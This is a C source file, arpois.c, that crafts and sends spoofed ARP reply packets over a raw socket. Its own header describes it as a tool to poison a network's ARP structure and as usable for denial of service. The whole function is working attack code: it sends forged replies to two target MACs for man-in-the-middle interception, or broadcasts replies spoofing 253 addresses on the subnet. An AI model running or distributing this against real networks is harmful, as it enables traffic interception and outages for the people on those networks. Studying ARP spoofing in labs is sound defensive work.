/*#############################################################################*
*                                                                              *
*               arpois.c            July 19, 2013           project eframe     *
*       Functions which can poison a network's arp structure. Could also be    *
*   used as a DOS attack. Function will send an arp packet to a given MAC      *
*   address as an arp response. The IP can then be spoofed. MAC spoofing       *
*   (to overcome MAC address filtering) will probably be added.                *
*                                                                              *
*#############################################################################*/

     #include "arpois.h"           // include self
     #include "netjack.h"
     #include <arpa/inet.h>
     #include <linux/if_packet.h>
     #include <string.h>
     #include <stdlib.h>
     #include <net/if.h>
     #include <netinet/ether.h>

     #include <stdio.h>
     #include <unistd.h>
     #include <net/if.h>  
     #include <netinet/in.h>
     #include <sys/ioctl.h>
     #include <sys/types.h>
     #include <sys/socket.h>

     /* generates one or more arp responses to spcfd MAC address; spoofs IP */
     /* ifName = interface name; ip_1 = target IP; ip_2 = spoof IP */
     int ARP_Response(char *ifName, int *mac_1, int *ip_1, int *ip_2, int *mac_2, int i_mode)
     {
         int sockfd;
         struct ifreq if_idx;
         struct ifreq if_mac;
         int tx_len = 0;
         char sendbuf[BUF_SIZ];
         struct ether_header *eh = (struct ether_header *) sendbuf;
         struct iphdr *iph = (struct iphdr *) (sendbuf + sizeof(struct ether_header));
         struct sockaddr_ll socket_address;

         /* Open RAW socket to send on */
         if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1) {
             perror("socket");
         }

         /* Get the index of the interface to send on */
         memset(&if_idx, 0, sizeof(struct ifreq));
         strncpy(if_idx.ifr_name, ifName, IFNAMSIZ-1);
         if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0)
             perror("SIOCGIFINDEX");

         /* Get the MAC address of the interface to send on */
         memset(&if_mac, 0, sizeof(struct ifreq));
         strncpy(if_mac.ifr_name, ifName, IFNAMSIZ-1);
         if (ioctl(sockfd, SIOCGIFHWADDR, &if_mac) < 0)
             perror("SIOCGIFHWADDR");

         // collect source ip only once to avoid waste in the loop   
         int source_ip[4] = { 0, 0, 0, 0 };
         if(Get_IP(ifName, source_ip) != 0)
         {
             printf("Failed to collect IP.\n");
             return -1;
         }

         /* Construct the Ethernet header */
         memset(sendbuf, 0, BUF_SIZ);

         /* getting ready to construct the packet */

         int i = 0;
         switch(i_mode)
         {
            case 0:
                i = 253;
                break;
            case 1:
                i = 1;
                break;
            case 2:
                i = 2;
                break;
         }
         while(i > 0)
         {
             tx_len = 0;                // reset the byte counter

             /* Ethernet header */
             eh->ether_shost[0] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[0];
             eh->ether_shost[1] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[1];
             eh->ether_shost[2] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[2];
             eh->ether_shost[3] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[3];
             eh->ether_shost[4] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[4];
             eh->ether_shost[5] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[5];
             if(i == 1 && i_mode != 0)
             {
                 eh->ether_dhost[0] = mac_1[0];
                 eh->ether_dhost[1] = mac_1[1];
                 eh->ether_dhost[2] = mac_1[2];
                 eh->ether_dhost[3] = mac_1[3];
                 eh->ether_dhost[4] = mac_1[4];
                 eh->ether_dhost[5] = mac_1[5];
             }
             if(i == 2 && i_mode != 0)
             {
                 eh->ether_dhost[0] = mac_2[0];
                 eh->ether_dhost[1] = mac_2[1];
                 eh->ether_dhost[2] = mac_2[2];
                 eh->ether_dhost[3] = mac_2[3];
                 eh->ether_dhost[4] = mac_2[4];
                 eh->ether_dhost[5] = mac_2[5];
             }
             else if(i_mode == 0)
             {
                 eh->ether_dhost[0] = 0xFF;
                 eh->ether_dhost[1] = 0xFF;
                 eh->ether_dhost[2] = 0xFF;
                 eh->ether_dhost[3] = 0xFF;
                 eh->ether_dhost[4] = 0xFF;
                 eh->ether_dhost[5] = 0xFF;

             }
             /* Ethertype field */
             eh->ether_type = htons(ETHERTYPE_ARP);
             tx_len += sizeof(struct ether_header);

             /* Packet data - all packet data will stay the same between
                an ARP request and ARP reply except the dest MAC address */
             sendbuf[tx_len++] = 0x00; // ethernet protocol 2 bytes
             sendbuf[tx_len++] = 0x01;
             sendbuf[tx_len++] = 0x08; // internet protocol 2 bytes
             sendbuf[tx_len++] = 0x00;

             // mac address length, 1 byte  
             sendbuf[tx_len++] = 0x06;

             // IP address length, 1 byte  
             sendbuf[tx_len++] = 0x04;

             // ARP request or reply 2 bytes
             sendbuf[tx_len++] = 0x00;
             sendbuf[tx_len++] = 0x02; // 1 = request; 2 = reply

             // source MAC address, 6 bytes (as indicated above)
             sendbuf[tx_len++] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[0];
             sendbuf[tx_len++] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[1];
             sendbuf[tx_len++] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[2];
             sendbuf[tx_len++] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[3];
             sendbuf[tx_len++] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[4];
             sendbuf[tx_len++] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[5];

             // source IP address, 4 bytes (as indicated above)
             // this is the spoofed IP being given
             if(i == 1 && i_mode != 0)
             {
                 sendbuf[tx_len++] = ip_2[0];
                 sendbuf[tx_len++] = ip_2[1];
                 sendbuf[tx_len++] = ip_2[2];
                 sendbuf[tx_len++] = ip_2[3];
             }
             else if(i == 2 && i_mode != 0)
             {
                 sendbuf[tx_len++] = ip_1[0];
                 sendbuf[tx_len++] = ip_1[1];
                 sendbuf[tx_len++] = ip_1[2];
                 sendbuf[tx_len++] = ip_1[3];
             }
             else if(i_mode == 0)
             {
                 sendbuf[tx_len++] = source_ip[0];
                 sendbuf[tx_len++] = source_ip[1];
                 sendbuf[tx_len++] = source_ip[2];
                 sendbuf[tx_len++] = i; // iterate for spoof

             }
             // destination MAC address, 6 bytes (as indicated above)
             // wil remain 0 for an ARP request; will have the MAC for ARP reply
             if(i == 1 && i_mode != 0)
             {
                 sendbuf[tx_len++] = mac_1[0];
                 sendbuf[tx_len++] = mac_1[1];
                 sendbuf[tx_len++] = mac_1[2];
                 sendbuf[tx_len++] = mac_1[3];
                 sendbuf[tx_len++] = mac_1[4];
                 sendbuf[tx_len++] = mac_1[5];
             }
             else if(i == 2 && i_mode != 0)
             {
                 sendbuf[tx_len++] = mac_2[0];
                 sendbuf[tx_len++] = mac_2[1];
                 sendbuf[tx_len++] = mac_2[2];
                 sendbuf[tx_len++] = mac_2[3];
                 sendbuf[tx_len++] = mac_2[4];
                 sendbuf[tx_len++] = mac_2[5];
             }
             else if(i_mode == 0)
             {
                 sendbuf[tx_len++] = 0xFF;
                 sendbuf[tx_len++] = 0xFF;
                 sendbuf[tx_len++] = 0xFF;
                 sendbuf[tx_len++] = 0xFF;
                 sendbuf[tx_len++] = 0xFF;
                 sendbuf[tx_len++] = 0xFF;

             }
             // destination IP address, 4 bytes (as indicated above)
             if(i == 1 && i_mode != 0)
             {
                 sendbuf[tx_len++] = ip_1[0];
                 sendbuf[tx_len++] = ip_1[1];
                 sendbuf[tx_len++] = ip_1[2];
                 sendbuf[tx_len++] = ip_1[3];
             }
             else if(i == 2 && i_mode != 0)
             {
                 sendbuf[tx_len++] = ip_2[0];
                 sendbuf[tx_len++] = ip_2[1];
                 sendbuf[tx_len++] = ip_2[2];
                 sendbuf[tx_len++] = ip_2[3];
             }
             else if(i_mode == 0)
             {
                 sendbuf[tx_len++] = source_ip[0];
                 sendbuf[tx_len++] = source_ip[1];
                 sendbuf[tx_len++] = source_ip[2];
                 sendbuf[tx_len++] = 0xFF; // make sure we sending to broadcast

             }
             /* Index of the network device */
             socket_address.sll_ifindex = if_idx.ifr_ifindex;
             /* Address length*/
             socket_address.sll_halen = ETH_ALEN;
             /* Destination MAC */
             if(i == 1 && i_mode != 0)
             {
                 socket_address.sll_addr[0] = mac_1[0];
                 socket_address.sll_addr[1] = mac_1[1];
                 socket_address.sll_addr[2] = mac_1[2];
                 socket_address.sll_addr[3] = mac_1[3];
                 socket_address.sll_addr[4] = mac_1[4];
                 socket_address.sll_addr[5] = mac_1[5];
             }
             if(i == 2 && i_mode != 0)
             {
                 socket_address.sll_addr[0] = mac_2[0];
                 socket_address.sll_addr[1] = mac_2[1];
                 socket_address.sll_addr[2] = mac_2[2];
                 socket_address.sll_addr[3] = mac_2[3];
                 socket_address.sll_addr[4] = mac_2[4];
                 socket_address.sll_addr[5] = mac_2[5];
             }
             else if(i_mode == 0)
             {
                 socket_address.sll_addr[0] = 0xFF;
                 socket_address.sll_addr[1] = 0xFF;
                 socket_address.sll_addr[2] = 0xFF;
                 socket_address.sll_addr[3] = 0xFF;
                 socket_address.sll_addr[4] = 0xFF;
                 socket_address.sll_addr[5] = 0xFF;
             }

             /* debug info */
            // printf("MAC destination: %.02x-%.02x-%.02x-%.02x-%.02x-%.02x\n", mac_1[0], mac_1[1], mac_1[2], mac_1[3], mac_1[4], mac_1[5]);
             //printf("IP destination: %d.%d.%d.%d\n", ip_1[0],ip_1[1],ip_1[2],ip_1[3]);
             //printf("IP spoof: %d.%d.%d.%d\n", ip_2[0],ip_2[1],ip_2[2],ip_2[3]);



             /* Send packet */
             if (sendto(sockfd, sendbuf, tx_len, 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
             {
                 printf("Send failed\n");
                 close(sockfd);
                 return -1;
             } 

             i--;
             /*if(i_mode == 2)
             {
                if(i < 1)
                {
                    i = 2;
                    printf("..\n");
                }
                sleep(1);
                printf("_\n");
             }*/
         }
         // close and shut down the packet
         close(sockfd);
         switch(i_mode)
         {
            case 0:
                ARP_Daemon(ifName, NULL, NULL, NULL, NULL, 0);
                break;
            case 2:
                //ARP_Daemon(ifName, mac_1, ip_1, ip_2, mac_2, 2);
                ARP_Daemon(ifName, NULL, NULL, NULL, NULL, 0);
                break;
         }

         return 0;
     }


